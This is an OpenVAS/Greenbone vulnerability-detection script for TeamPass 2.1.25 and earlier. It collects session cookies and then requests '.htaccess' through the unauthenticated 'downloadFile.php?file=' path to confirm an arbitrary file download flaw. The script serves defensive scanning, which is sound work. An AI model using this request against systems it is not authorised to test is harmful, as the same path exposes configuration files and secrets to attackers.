CPE = "cpe:/a:teampass:teampass";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106166" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2016-08-03 11:33:48 +0700 (Wed, 03 Aug 2016)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "TeamPass Arbitrary File Download and Unauthenticated Blind SQL Injection Vulnerability" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_teampass_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "teampass/installed" );
	script_tag( name: "summary", value: "TeamPass is prone to an arbitrary file download vulnerability." );
	script_tag( name: "vuldetect", value: "Tries to download .htaccess file." );
	script_tag( name: "insight", value: "The web vulnerability is located in the 'downloadFile.php' file.
Remote attackers are able to download internal uploaded files without any authentication. On older versions
it is even possible to download configuration files from the app exposing sensitive information to the
attacker" );
	script_tag( name: "impact", value: "An unauthenticated attacker may download arbitrary files and gain
sensitive information." );
	script_tag( name: "affected", value: "Version 2.1.25 and prior." );
	script_tag( name: "solution", value: "Upgrade to Version 2.1.26 or later" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/137180/Teampass-2.1.25-Arbitrary-File-Download.html" );
	script_xref( name: "URL", value: "http://teampass.net/2016-05-13-release-2.1.26" );
	script_xref( name: "URL", value: "https://blog.ripstech.com/2016/teampass-unauthenticated-sql-injection/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
req = http_get( item: dir + "/index.php", port: port );
res = http_keepalive_send_recv( port: port, data: req );
cookie = eregmatch( pattern: "Set-Cookie: (PHPSESSID=[A-Za-z0-9;]+)", string: res );
if(!isnull( cookie[1] )){
	cookie = cookie[1];
}
keycookie = eregmatch( pattern: "(KEY_PHPSESSID=[A-Za-z0-9;%]+)", string: res );
if(!isnull( keycookie[1] )){
	cookie = cookie + " " + keycookie[1];
}
if(isnull( cookie )){
	exit( 0 );
}
url = dir + "/sources/downloadFile.php?file=.htaccess";
if(http_vuln_check( port: port, url: url, pattern: "AddHandler", check_header: TRUE, extra_check: "Options", cookie: cookie, check_nomatch: "Hacking attempt..." )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

